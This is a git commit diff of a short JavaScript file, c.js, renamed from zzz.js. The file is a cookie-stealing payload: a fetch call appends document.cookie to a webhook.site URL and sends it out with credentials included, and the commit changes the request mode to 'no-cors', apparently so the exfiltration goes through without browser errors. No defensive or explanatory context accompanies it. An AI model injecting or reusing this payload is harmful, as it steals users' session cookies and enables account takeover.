11bbc86743142db0a998d59ba8e27e025ca7ad12
shyeun <96280288+shyeun@users.noreply.github.com>
2022-01-28 17:15:44 +0900

    Update and rename zzz.js to c.js

--- c.js
+++ c.js
@@ -1,6 +1,5 @@
 fetch('https://webhook.site/fb6f68c3-2ba1-4413-9b6a-eec76e47338b?a='+document.cookie,{
   method:'GET',
-  mode: 'cors',
-  credentials: 'include',
-  Access-Control-Allow-Origin : *
+  mode: 'no-cors',
+  credentials: 'include'
 })
